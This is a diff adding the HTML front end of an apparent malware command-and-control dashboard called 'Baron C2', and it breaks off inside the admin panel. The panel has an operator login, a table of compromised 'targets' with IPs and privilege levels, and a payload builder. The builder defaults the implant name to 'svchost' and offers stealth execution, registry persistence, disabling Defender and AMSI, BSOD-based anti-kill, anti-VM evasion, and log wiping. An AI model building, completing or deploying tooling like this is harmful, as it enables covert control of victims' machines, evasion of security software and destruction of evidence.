@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BARON GOD MODE — SOVEREIGN OS</title>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- Core Libraries -->
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+
+    <style>
+        :root {
+            /* Base Theme - God Mode Gold */
+            --accent: #D4AF37;
+            --accent-glow: rgba(212, 175, 55, 0.4);
+            --bg-void: #030305;
+            --glass-bg: rgba(12, 12, 20, 0.45);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --text-main: #ffffff;
+            --text-muted: rgba(255, 255, 255, 0.5);
+            
+            /* UI Metrics */
+            --blur-heavy: 40px;
+            --blur-light: 15px;
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --font-sans: 'Outfit', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            
+            /* Status Colors */
+            --danger: #ff3366;
+            --success: #00e676;
+            --warning: #ffb300;
+        }
+
+        /* Customizable Themes via JS */
+        [data-theme="sapphire"] { --accent: #2f80ed; --accent-glow: rgba(47, 128, 237, 0.4); }
+        [data-theme="ruby"]     { --accent: #ff4757; --accent-glow: rgba(255, 71, 87, 0.4); }
+        [data-theme="emerald"]  { --accent: #2ed573; --accent-glow: rgba(46, 213, 115, 0.4); }
+        [data-theme="amethyst"] { --accent: #9b59b6; --accent-glow: rgba(155, 89, 182, 0.4); }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        
+        body, html {
+            width: 100vw; height: 100vh;
+            overflow: hidden;
+            background-color: var(--bg-void);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+        }
+
+        /* Scrollbars */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+        /* -----------------------------------------------------
+           3D WebGL Background Layer
+        ----------------------------------------------------- */
+        #canvas-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Ambient Lighting / Mesh overlay */
+        .ambient-mesh {
+            position: fixed; inset: 0; z-index: 1;
+            background: radial-gradient(circle at 50% 50%, transparent 20%, var(--bg-void) 120%);
+            mix-blend-mode: multiply;
+            pointer-events: none;
+        }
+
+        /* -----------------------------------------------------
+           Glassmorphism Toolkit
+        ----------------------------------------------------- */
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(var(--blur-heavy));
+            -webkit-backdrop-filter: blur(var(--blur-heavy));
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-lg);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1);
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        /* -----------------------------------------------------
+           Auth Screen
+        ----------------------------------------------------- */
+        #auth-screen {
+            position: fixed; inset: 0; z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            background: var(--bg-void);
+            transition: opacity 0.8s ease, visibility 0.8s;
+        }
+        .auth-card {
+            width: 440px; padding: 50px; text-align: center;
+            position: relative; overflow: hidden;
+            animation: floatIn 1.2s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        @keyframes floatIn {
+            0% { opacity: 0; transform: translateY(40px) scale(0.95); filter: blur(10px); }
+            100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        }
+        .auth-logo {
+            font-size: 3rem; font-weight: 900; letter-spacing: 12px;
+            background: linear-gradient(135deg, #fff 20%, var(--accent) 80%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
+            margin-bottom: 5px;
+        }
+        .auth-sub {
+            font-size: 0.75rem; letter-spacing: 6px; color: var(--accent);
+            text-transform: uppercase; margin-bottom: 40px; opacity: 0.8;
+        }
+        .input-group { position: relative; margin-bottom: 20px; }
+        .input-group i {
+            position: absolute; left: 20px; top: 50%; transform: translateY(-50%);
+            color: var(--text-muted); transition: 0.3s;
+        }
+        .glass-input {
+            width: 100%; padding: 18px 20px 18px 50px;
+            background: rgba(0,0,0,0.2); border: 1px solid var(--glass-border);
+            border-radius: var(--radius-md); color: #fff;
+            font-family: var(--font-sans); font-size: 1rem; outline: none;
+            transition: 0.3s;
+        }
+        .glass-input:focus {
+            border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow);
+            background: rgba(0,0,0,0.4);
+        }
+        .glass-input:focus + i { color: var(--accent); }
+        .auth-btn {
+            width: 100%; padding: 18px; margin-top: 10px;
+            background: var(--accent); color: #000;
+            font-family: var(--font-sans); font-weight: 800; font-size: 1.1rem;
+            letter-spacing: 2px; border: none; border-radius: var(--radius-md);
+            cursor: pointer; transition: 0.4s; position: relative; overflow: hidden;
+        }
+        .auth-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px var(--accent-glow);
+        }
+
+        /* -----------------------------------------------------
+           OS Workspace (Desktop -> Dashboard Site)
+        ----------------------------------------------------- */
+        #workspace {
+            position: fixed; inset: 0; z-index: 10;
+            display: none; opacity: 0;
+            transition: opacity 1s ease;
+            overflow-y: auto;
+            padding: 80px 20px 40px 20px;
+        }
+        .dashboard-grid {
+            max-width: 1600px; margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 30px;
+            align-items: start;
+        }
+
+        /* -----------------------------------------------------
+           Dynamic Island (Liquid Glass)
+        ----------------------------------------------------- */
+        .dynamic-island {
+            position: fixed; top: 15px; left: 50%; transform: translateX(-50%);
+            background: linear-gradient(135deg, rgba(255,255,255,0.08) 0%, rgba(255,255,255,0.02) 50%, rgba(255,255,255,0.06) 100%);
+            backdrop-filter: blur(40px) saturate(180%);
+            -webkit-backdrop-filter: blur(40px) saturate(180%);
+            border-radius: 40px;
+            height: 44px; min-width: 220px; max-width: 500px;
+            display: flex; align-items: center; justify-content: center;
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow:
+                0 8px 32px rgba(0,0,0,0.4),
+                inset 0 1px 0 rgba(255,255,255,0.15),
+                inset 0 -1px 0 rgba(0,0,0,0.1),
+                0 0 0 0.5px rgba(255,255,255,0.08);
+            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 1000; overflow: hidden; cursor: pointer;
+            padding: 0 20px;
+        }
+        .dynamic-island::before {
+            content: ''; position: absolute; inset: 0;
+            border-radius: inherit;
+            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.04) 50%, transparent 70%);
+            animation: liquid-shimmer 4s ease-in-out infinite;
+        }
+        @keyframes liquid-shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .dynamic-island:hover {
+            min-width: 340px;
+            box-shadow:
+                0 12px 40px rgba(0,0,0,0.5),
+                inset 0 1px 0 rgba(255,255,255,0.2),
+                0 0 20px var(--accent-glow);
+        }
+        .dynamic-island.island-alert {
+            min-width: 360px;
+            border-color: var(--accent);
+            box-shadow: 0 8px 40px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.15);
+            animation: island-glow 0.5s ease;
+        }
+        .dynamic-island.island-danger {
+            border-color: var(--danger);
+            box-shadow: 0 8px 40px rgba(255,51,102,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
+        }
+        .dynamic-island.island-success {
+            border-color: var(--success);
+            box-shadow: 0 8px 40px rgba(0,230,118,0.25), inset 0 1px 0 rgba(255,255,255,0.15);
+        }
+        @keyframes island-glow {
+            0% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.05); }
+            100% { transform: translateX(-50%) scale(1); }
+        }
+        .island-content {
+            display: flex; align-items: center; gap: 10px;
+            font-size: 0.82rem; font-weight: 500; font-family: var(--font-mono);
+            position: relative; z-index: 1; white-space: nowrap;
+        }
+        .island-icon {
+            font-size: 0.9rem; color: var(--accent);
+            transition: color 0.3s;
+        }
+        .island-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 10px var(--success);
+            animation: pulse 2s infinite;
+            flex-shrink: 0;
+        }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        .island-badge {
+            background: var(--accent); color: #000;
+            font-size: 0.65rem; font-weight: 800;
+            padding: 2px 7px; border-radius: 10px;
+            margin-left: 4px;
+        }
+
+        /* Expanded Island State */
+        .dynamic-island.expanded {
+            min-width: 420px; height: 140px; border-radius: 24px;
+            align-items: flex-start; padding: 20px;
+            flex-direction: column;
+        }
+
+        /* -----------------------------------------------------
+           Static Windows (Dashboard Cards)
+        ----------------------------------------------------- */
+        .os-window {
+            position: relative;
+            background: var(--glass-bg); backdrop-filter: blur(var(--blur-heavy));
+            border: 1px solid var(--glass-border); border-radius: var(--radius-md);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.02) inset;
+            display: flex; flex-direction: column; overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+            animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .os-window:hover {
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 0 1px var(--accent) inset;
+        }
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.95) translateY(10px); filter: blur(5px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
+        }
+        .win-header {
+            height: 48px; background: rgba(0,0,0,0.4);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 20px; border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .win-title { font-weight: 600; font-size: 0.95rem; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; }
+        .win-body { flex: 1; overflow: auto; position: relative; padding: 20px; }
+
+        /* Card Specific Overrides */
+        #win-clients { grid-column: 1 / -1; min-height: 400px; max-height: 600px; }
+        #win-builder { min-height: 600px; }
+        #win-logs    { min-height: 500px; max-height: 600px; }
+        #win-changelog{ min-height: 500px; max-height: 600px; overflow-y: auto; }
+
+        /* -----------------------------------------------------
+           Admin Center
+        ----------------------------------------------------- */
+        .admin-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .admin-card {
+            background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05);
+            padding: 20px; border-radius: 12px; text-align: center; cursor: pointer;
+            transition: 0.3s;
+        }
+        .admin-card i { font-size: 2rem; margin-bottom: 10px; color: var(--accent); }
+        .admin-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.05); border-color: var(--accent); }
+        .admin-card.danger i { color: var(--danger); }
+        .admin-card.danger:hover { box-shadow: 0 0 20px rgba(255,51,102,0.3); border-color: var(--danger); }
+
+        /* -----------------------------------------------------
+           Changelog
+        ----------------------------------------------------- */
+        .cl-item { border-left: 2px solid var(--accent); padding-left: 15px; margin-bottom: 20px; position: relative; }
+        .cl-item::before { content: ''; position: absolute; left: -6px; top: 0; width: 10px; height: 10px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
+        .cl-version { font-size: 1.1rem; font-weight: 700; color: #fff; margin-bottom: 5px; }
+        .cl-date { font-size: 0.8rem; color: var(--text-muted); font-family: var(--font-mono); margin-bottom: 10px; }
+        .cl-list { list-style: none; padding: 0; color: rgba(255,255,255,0.8); font-size: 0.9rem; }
+        .cl-list li { margin-bottom: 5px; padding-left: 15px; position: relative; }
+        .cl-list li::before { content: '-'; position: absolute; left: 0; color: var(--text-muted); }
+
+        /* -----------------------------------------------------
+           Data Tables (Clients)
+        ----------------------------------------------------- */
+        .glass-table { width: 100%; border-collapse: collapse; text-align: left; }
+        .glass-table th {
+            padding: 15px; font-size: 0.8rem; color: var(--text-muted);
+            text-transform: uppercase; letter-spacing: 2px;
+            border-bottom: 1px solid var(--glass-border);
+            font-weight: 600;
+        }
+        .glass-table td {
+            padding: 16px 15px; font-size: 0.95rem; border-bottom: 1px solid rgba(255,255,255,0.03);
+            vertical-align: middle;
+        }
+        .glass-table tr { transition: 0.2s; cursor: context-menu; }
+        .glass-table tr:hover { background: rgba(255,255,255,0.03); }
+        
+        .status-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 700;
+        }
+        .status-online { background: rgba(0, 230, 118, 0.1); color: var(--success); border: 1px solid rgba(0, 230, 118, 0.2); }
+        .status-offline { background: rgba(255, 51, 102, 0.1); color: var(--danger); border: 1px solid rgba(255, 51, 102, 0.2); }
+        .status-new { background: rgba(212, 175, 55, 0.1); color: var(--accent); border: 1px solid rgba(212, 175, 55, 0.3); animation: flash 2s infinite; }
+        @keyframes flash {
+            0% { box-shadow: 0 0 0px var(--accent-glow); }
+            50% { box-shadow: 0 0 15px var(--accent-glow); }
+            100% { box-shadow: 0 0 0px var(--accent-glow); }
+        }
+
+        .os-icon { font-size: 1.2rem; margin-right: 10px; opacity: 0.9; }
+
+        /* -----------------------------------------------------
+           Context Menu (Right Click on Client)
+        ----------------------------------------------------- */
+        #context-menu {
+            position: fixed; z-index: 10000; width: 240px;
+            background: rgba(10, 10, 15, 0.85); backdrop-filter: blur(30px);
+            border: 1px solid var(--glass-border); border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
+            padding: 8px; display: none; opacity: 0; transform: scale(0.95);
+            transition: opacity 0.1s, transform 0.1s;
+            max-height: 50vh;
+            overflow-y: auto;
+            max-height: 40vh;
+            overflow-y: auto;
+        }
+        #context-menu.active { display: block; opacity: 1; transform: scale(1); }
+        .cm-group { border-bottom: 1px solid rgba(255,255,255,0.05); padding: 4px 0; margin-bottom: 4px; }
+        .cm-group:last-child { border: none; margin: 0; padding-bottom: 0; }
+        .cm-title { font-size: 0.65rem; color: var(--text-muted); padding: 4px 12px; text-transform: uppercase; letter-spacing: 2px; }
+        .cm-item {
+            display: flex; align-items: center; gap: 12px;
+            padding: 10px 12px; border-radius: 8px; font-size: 0.85rem;
+            color: #fff; cursor: pointer; transition: 0.2s;
+        }
+        .cm-item i { width: 16px; text-align: center; color: var(--accent); }
+        .cm-item:hover { background: var(--accent); color: #000; }
+        .cm-item:hover i { color: #000; }
+        .cm-item.danger:hover { background: var(--danger); }
+
+        /* -----------------------------------------------------
+           Terminal / Logs Window
+        ----------------------------------------------------- */
+        .terminal-box {
+            background: rgba(0,0,0,0.5); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05);
+            padding: 15px; height: 100%; font-family: var(--font-mono); font-size: 0.85rem;
+            overflow-y: auto; display: flex; flex-direction: column; gap: 8px;
+        }
+        .log-line { display: flex; gap: 10px; line-height: 1.4; word-break: break-all; }
+        .log-time { color: var(--text-muted); flex-shrink: 0; }
+        .log-info { color: var(--text-main); }
+        .log-warn { color: var(--warning); }
+        .log-err { color: var(--danger); }
+        .log-succ { color: var(--success); }
+        .log-sys { color: var(--accent); font-weight: bold; }
+
+        /* -----------------------------------------------------
+           Builder Window & Form
+        ----------------------------------------------------- */
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 8px; }
+        
+        /* Modern Checkbox Toggle */
+        .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 12px; background: rgba(0,0,0,0.2); border-radius: 12px; margin-bottom: 10px; border: 1px solid transparent; transition: 0.3s; }
+        .toggle-row:hover { border-color: rgba(255,255,255,0.1); }
+        .toggle-label { font-size: 0.9rem; display: flex; align-items: center; gap: 10px; }
+        .toggle-label i { color: var(--accent); width: 20px; text-align: center; }
+        
+        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.1); transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: #fff; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
+        input:checked + .slider:before { transform: translateX(20px); background-color: #000; }
+
+        .btn-primary {
+            width: 100%; padding: 16px; background: var(--accent); color: #000;
+            font-family: var(--font-sans); font-weight: 800; border: none; border-radius: 12px; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; letter-spacing: 2px; margin-top: 10px;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px var(--accent-glow); }
+
+        /* -----------------------------------------------------
+           Theme Selector
+        ----------------------------------------------------- */
+        .theme-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .theme-btn {
+            padding: 20px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05);
+            background: rgba(0,0,0,0.3); color: #fff; cursor: pointer; transition: 0.3s;
+            display: flex; flex-direction: column; align-items: center; gap: 10px; font-weight: 600;
+        }
+        .theme-btn:hover { background: rgba(255,255,255,0.05); }
+        .theme-btn .color-blob { width: 30px; height: 30px; border-radius: 50%; box-shadow: 0 0 20px currentColor; }
+        .theme-btn.sapphire { color: #2f80ed; }
+        .theme-btn.emerald { color: #2ed573; }
+        .theme-btn.amethyst { color: #9b59b6; }
+        .theme-btn.ruby { color: #ff4757; }
+        .theme-btn.gold { color: #D4AF37; }
+
+        /* -----------------------------------------------------
+           Result Modal (Full Output Viewer)
+        ----------------------------------------------------- */
+        .result-overlay {
+            position: fixed; inset: 0; z-index: 50000;
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
+            display: none; align-items: center; justify-content: center;
+            opacity: 0; transition: opacity 0.3s;
+        }
+        .result-overlay.active { display: flex; opacity: 1; }
+        .result-modal {
+            width: 90%; max-width: 800px; max-height: 80vh;
+            background: rgba(8,8,16,0.95); backdrop-filter: blur(40px);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+            display: flex; flex-direction: column;
+            animation: modalIn 0.3s ease;
+        }
+        @keyframes modalIn {
+            0% { opacity: 0; transform: scale(0.95) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .result-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 24px; border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+        .result-header h3 { font-size: 1rem; color: var(--accent); letter-spacing: 1px; }
+        .result-close {
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+            color: #fff; font-size: 1rem; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: 0.3s;
+        }
+        .result-close:hover { background: var(--danger); border-color: var(--danger); }
+        .result-body {
+            flex: 1; overflow-y: auto; padding: 20px 24px;
+            font-family: var(--font-mono); font-size: 0.85rem;
+            color: var(--success); line-height: 1.6;
+            white-space: pre-wrap; word-break: break-all;
+        }
+
+        /* Screen Viewer Overlay */
+        .screen-overlay {
+            position: fixed; inset: 0; z-index: 49000;
+            background: rgba(0,0,0,0.85);
+            display: none; align-items: center; justify-content: center;
+            flex-direction: column;
+        }
+        .screen-overlay.active { display: flex; }
+        .screen-overlay img {
+            max-width: 90vw; max-height: 80vh;
+            border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+        }
+        .screen-bar {
+            display: flex; gap: 15px; align-items: center;
+            margin-top: 15px; padding: 10px 20px;
+            background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
+            border-radius: 30px; border: 1px solid rgba(255,255,255,0.1);
+        }
+        .screen-bar button {
+            background: var(--danger); color: #fff; border: none;
+            padding: 8px 20px; border-radius: 20px; cursor: pointer;
+            font-weight: 700; font-family: var(--font-sans);
+            transition: 0.3s;
+        }
+        .screen-bar button:hover { transform: scale(1.05); }
+        .screen-bar span { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); }
+
+    
+        /* Draggable Windows Engine */
+        .drag-window {
+            position: fixed; z-index: 10500;
+            background: rgba(15, 15, 20, 0.95); backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border); border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
+            display: flex; flex-direction: column; overflow: hidden;
+            min-width: 300px; min-height: 150px; resize: both;
+        }
+        .drag-header {
+            background: rgba(0,0,0,0.5); padding: 10px 15px; cursor: grab;
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid var(--glass-border);
+            user-select: none;
+        }
+        .drag-header:active { cursor: grabbing; }
+        .drag-title { font-weight: 600; font-size: 0.95rem; display: flex; align-items: center; gap: 8px; }
+        .drag-close { cursor: pointer; color: var(--text-muted); transition: 0.2s; }
+        .drag-close:hover { color: #ff4757; }
+        .drag-content {
+            flex: 1; padding: 15px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;
+        }
+        
+        /* Process Table */
+        .proc-table { width: 100%; border-collapse: collapse; }
+        .proc-table th, .proc-table td { padding: 6px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .proc-table th { color: var(--text-muted); position: sticky; top: 0; background: #0f0f14; }
+        .btn-action { background: rgba(255,255,255,0.1); border: none; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 0.8rem; transition: 0.2s; margin-right: 4px;}
+        .btn-action:hover { background: rgba(255,255,255,0.2); }
+        .btn-kill { background: rgba(255,71,87,0.2); color: #ff4757; }
+        .btn-kill:hover { background: rgba(255,71,87,0.4); }
+
+        /* Transitions */
+        .hidden { opacity: 0 !important; visibility: hidden !important; pointer-events: none !important; }
+        .fade-in { animation: fadeIn 0.8s forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Island Buttons */
+        #island-action-container { display: flex; gap: 8px; margin-top: 12px; }
+        .island-btn {
+            background: var(--accent); color: #000; border: none;
+            padding: 6px 14px; border-radius: 12px; font-size: 0.7rem;
+            font-weight: 800; cursor: pointer; transition: 0.2s;
+            text-transform: uppercase;
+        }
+        .island-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
+    </style>
+</head>
+<body>
+
+    <!-- 3D Background Engine -->
+    <div id="canvas-container"></div>
+    <div class="ambient-mesh"></div>
+
+    <!-- Auth Screen -->
+    <div id="auth-screen">
+        <div class="glass-panel auth-card">
+            <h1 class="auth-logo">BARON</h1>
+            <div class="auth-sub">Sovereign Edition C2</div>
+            <div class="input-group">
+                <i class="fa-solid fa-user"></i>
+                <input type="text" id="login-user" class="glass-input" placeholder="Operator ID" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-key"></i>
+                <input type="password" id="login-pass" class="glass-input" placeholder="Access Key">
+            </div>
+            <button id="btn-login" class="auth-btn">AUTHORIZE</button>
+            <div id="auth-error" style="color: var(--danger); margin-top: 15px; font-size: 0.85rem; min-height: 20px;"></div>
+        </div>
+    </div>
+
+    <!-- Main Workspace (Desktop) -->
+    <div id="workspace">
+        
+        <!-- Dynamic Island (Liquid Glass) -->
+        <div class="dynamic-island" id="dynamic-island" onclick="toggleIsland()">
+            <div class="island-content">
+                <div class="island-dot"></div>
+                <i class="island-icon fa-solid fa-shield-halved"></i>
+                <span id="island-text">BARON C2 ACTIVE</span>
+                <span class="island-badge" id="island-badge">0</span>
+            </div>
+            <div id="island-action-container"></div>
+        </div>
+
+        <div class="dashboard-grid">
+            <!-- Card: Clients -->
+            <div class="os-window" id="win-clients">
+                <div class="win-header">
+                    <div class="win-title"><i class="fa-solid fa-globe"></i> Global Network</div>
+                    <div class="win-controls">
+                        <button class="btn-action" id="btn-refresh-clients" onclick="refreshClientsList()" title="Refresh List"><i class="fa-solid fa-sync-alt"></i> REFRESH</button>
+                    </div>
+                </div>
+            <div class="win-body" style="padding: 0;">
+                <table class="glass-table" id="clients-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Target / User</th>
+                            <th>IP Addr</th>
+                            <th>OS Info</th>
+                            <th>Integrity</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="clients-body">
+                        <!-- Dynamic Rows -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+            <!-- Card: Builder -->
+            <div class="os-window" id="win-builder">
+                <div class="win-header">
+                    <div class="win-title"><i class="fa-solid fa-hammer"></i> Payload Engine</div>
+                </div>
+            <div class="win-body">
+                <div class="form-group">
+                    <label class="form-label">C2 Server URL</label>
+                    <input type="text" id="b-url" class="glass-input" placeholder="https://your-c2.render.com" style="padding-left: 15px;">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Agent Name (Process)</label>
+                    <input type="text" id="b-name" class="glass-input" value="svchost" style="padding-left: 15px;">
+                </div>
+                
+                <h4 style="margin: 20px 0 10px; color: var(--accent); letter-spacing: 2px;">Core Modules</h4>
+                
+                <div class="toggle-row">
+                    <div class="toggle-label"><i class="fa-solid fa-ghost"></i> Stealth Execution (Hidden)</div>
+                    <label class="switch"><input type="checkbox" id="b-hide" checked><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label"><i class="fa-solid fa-anchor"></i> Registry Persistence</div>
+                    <label class="switch"><input type="checkbox" id="b-persist" checked><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label"><i class="fa-solid fa-shield-virus"></i> Disable Defender & AMDI</div>
+                    <label class="switch"><input type="checkbox" id="b-defend"><span class="slider"></span></label>
+                </div>
+                
+                <h4 style="margin: 20px 0 10px; color: var(--danger); letter-spacing: 2px;">God Mode Exploits</h4>
+
+                <div class="toggle-row">
+                    <div class="toggle-label" style="color: var(--danger)"><i class="fa-solid fa-skull"></i> Anti-Kill (BSOD Protection)</div>
+                    <label class="switch"><input type="checkbox" id="b-bsod"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label" style="color: var(--danger)"><i class="fa-solid fa-eye-slash"></i> Anti-VM / Analysis Evasion</div>
+                    <label class="switch"><input type="checkbox" id="b-anti"><span class="slider"></span></label>
+                </div>
+
+                <button class="btn-primary" onclick="compilePayload()" id="btn-build">Compile Binary</button>
+            </div>
+        </div>
+
+            <!-- Card: Logs -->
+            <div class="os-window" id="win-logs">
+                <div class="win-header">
+                    <div class="win-title"><i class="fa-solid fa-terminal"></i> Sovereign Terminal</div>
+                </div>
+            <div class="win-body">
+                <div class="terminal-box" id="terminal">
+                    <div class="log-line"><span class="log-time">[SYS]</span> <span class="log-sys">Baron C2 Initialized. Secure Connection Established.</span></div>
+                </div>
+            </div>
+        </div>
+
+            <!-- Card: Settings -->
+            <div class="os-window" id="win-settings">
+                <div class="win-header">
+                    <div class="win-title"><i class="fa-solid fa-sliders"></i> OS Theming & System</div>
+                </div>
+                <div class="win-body">
+                    <button class="btn-primary" style="background: var(--danger); margin-bottom: 20px;" onclick="logout()"><i class="fa-solid fa-power-off"></i> Disconnect / Logout</button>
+                <p style="margin-bottom: 20px; color: var(--text-muted);">Select Interface Resonance Matrix:</p>
+                <div class="theme-grid">
+                    <div class="theme-btn gold" onclick="setTheme('gold')">
+                        <div class="color-blob"></div> Sovereign Gold
+                    </div>
+                    <div class="theme-btn sapphire" onclick="setTheme('sapphire')">
+                        <div class="color-blob"></div> Deep Sapphire
+                    </div>
+                    <div class="theme-btn ruby" onclick="setTheme('ruby')">
+                        <div class="color-blob"></div> Blood Ruby
+                    </div>
+                    <div class="theme-btn emerald" onclick="setTheme('emerald')">
+                        <div class="color-blob"></div> Toxic Emerald
+                    </div>
+                    <div class="theme-btn amethyst" onclick="setTheme('amethyst')">
+                        <div class="color-blob"></div> Void Amethyst
+                    </div>
+                </div>
+            </div>
+        </div>
+
+            <!-- Card: Admin Center -->
+            <div class="os-window" id="win-admin">
+                <div class="win-header">
+                    <div class="win-title"><i class="fa-solid fa-crown" style="color: var(--accent)"></i> God Mode Admin Center</div>
+                </div>
+            <div class="win-body">
+                <h4 style="margin-bottom: 20px; color: var(--text-muted); text-transform: uppercase;">Server Control</h4>
+                <div class="admin-grid">
+                    <div class="admin-card" onclick="adminAction('clear_logs')">
+                        <i class="fa-solid fa-eraser"></i>
+                        <h4>Wipe Logs</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Clear all terminal events</p>
+                    </div>
+                    <div class="admin-card" onclick="adminAction('clean_db')">
+                        <i class="fa-solid fa-database"></i>
+                        <h4>Clean Database</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Remove dead ghosts</p>
+                    </div>
+                    <div class="admin-card danger" onclick="adminAction('panic')">
